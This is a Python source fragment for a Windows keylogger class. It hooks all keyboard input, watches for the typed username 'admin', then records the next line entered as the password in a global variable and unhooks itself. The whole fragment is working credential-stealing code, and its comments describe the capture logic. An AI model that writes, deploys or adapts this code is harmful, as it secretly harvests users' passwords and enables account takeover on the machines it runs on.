class KeyHandler:

	def __init__(self):
		self.hm = pyHook.HookManager()
		self.hm.KeyDown = self.OnKeyboardCharEvent
		self.hm.HookKeyboard()
		pythoncom.PumpMessages()

	def OnKeyboardCharEvent(self,event):

		global keybuffer
		global password
		global userflagged

		keylogs=chr(event.Ascii)
		if event.Ascii==8:
			if len(keybuffer) > 1: keybuffer = keybuffer[0:len(keybuffer)-1]
		elif event.Ascii==13:
			# If a password was being captured, return it
			# Check for password capture first ... just in case the user name and password are the same
			if userflagged:
				password = keybuffer
				userflagged = False
				keybuffer = ""
				self.killKey()
			# If default user name is encountered, begin to capture the password that would follow
			elif keybuffer=="admin":
				keybuffer = ""
				userflagged = True
			# It is neither a password nor a default user name.  Dump the buffer!
			else:
				keybuffer = ""
		else:
			# Accumulate the keys entered into a buffer
			keybuffer+=keylogs
		return True

	def __call__(self):

		pass

	def killKey(self):

		self.hm.UnhookKeyboard()
		ctypes.windll.user32.PostQuitMessage(0)

